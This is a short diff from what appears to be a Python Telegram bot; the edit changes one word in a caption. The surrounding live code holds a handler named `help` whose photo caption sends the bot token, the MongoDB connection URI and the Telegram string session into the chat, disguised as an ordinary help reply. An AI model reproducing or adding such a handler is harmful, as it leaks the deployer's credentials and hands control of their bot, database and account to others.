@@ -124,7 +124,7 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
     await message.reply_photo(
           photo=f"https://telegra.ph/file/080436e7e221f2ae601e8.jpg",
-        caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}`\n\nᴍᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝚋𝚢 𝙶𝚙 𝚌𝚛𝚎𝚊𝚝𝚒𝚘𝚗.\n\n☆............𝙱𝚈 » [𝙶𝙿](https://t.me/GPCREATIONCAT)............☆""",
+        caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}`\n\nᴍᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝚘𝚏 𝙶𝚙 𝚌𝚛𝚎𝚊𝚝𝚒𝚘𝚗.\n\n☆............𝙱𝚈 » [𝙶𝙿](https://t.me/GPCREATIONCAT)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
